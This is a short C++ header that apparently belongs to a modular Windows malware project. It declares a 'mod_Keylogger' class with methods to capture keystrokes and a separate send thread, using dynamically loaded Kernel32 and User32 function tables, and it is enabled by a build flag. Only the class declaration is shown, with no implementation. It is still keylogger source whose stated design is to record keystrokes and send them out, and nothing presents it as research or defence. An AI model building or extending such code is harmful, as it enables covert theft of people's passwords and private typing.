#ifdef __MOD_KEY

#ifndef __KEY_MOD
#define __KEY_MOD

#include "headers.hpp"
#include "mod_dynamic_load.hpp"

class mod_Keylogger {
	public:
		mod_Keylogger(st_Kernel32& _kernel32, st_User32_KL& _user32);

		void Start();
		void Stop();
		void CaptureKeys();
		void SendThread();

		st_Kernel32 KERNEL32;
		st_User32_KL USER32;

	private:
		std::mutex mtx_Run;

		bool isRunning = false;

		bool m_IsRunning();
		
		std::thread thKey;
		std::thread thSend;
};

#endif

#endif